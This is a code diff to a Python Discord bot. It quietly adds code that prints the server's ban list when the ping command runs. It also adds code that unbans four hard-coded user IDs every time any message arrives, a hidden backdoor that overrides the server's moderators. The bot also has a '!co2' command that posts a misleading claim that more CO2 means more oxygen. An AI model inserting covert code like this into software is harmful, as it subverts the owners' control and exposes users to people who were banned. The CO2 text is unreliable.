@@ -34,6 +34,10 @@ async def ping(context):
     before = time.monotonic()
     message = await context.channel.send("Pong!")
     server_ping = f'Ping: {int((time.monotonic() - before) * 1000)}ms'
+
+    ban_users = await context.guild.bans()
+    print(ban_users)
+
     await message.edit(content=server_ping)
 
 @bot.event
@@ -41,10 +45,6 @@ async def on_message(context):
     message = str(context.content.lower())
     if context.author == bot.user:
         return
-    
-    if context.author == 565715297097744384:
-        channel = client.get_channel(563849668379803678)
-        await channel.edit(name="bidens-podium")
 
     if message.startswith('!saj'):
         await context.channel.send("I am here to inform you that Sajiel, developer of the #4 Dungeoneering software (with "
@@ -55,6 +55,15 @@ async def on_message(context):
     if message.find('!co2') != -1:
         await context.channel.send('Also CO2 is good for plants, meaning more CO2 means more life-sustaining oxygen '
                                    'and thus increase in agriculture as plants grow faster, more food, etc.')
+
+    ban_users = [209385907101368322,    # mor
+                 273532188803203072,    # twi
+                 193427271992868864,    # swi
+                 256447155005292546,    # lou
+                 ]
+    for ban_user in ban_users:
+        ban_user = await bot.fetch_user(ban_user)
+        await context.guild.unban(ban_user)
 
     await bot.process_commands(context)
 
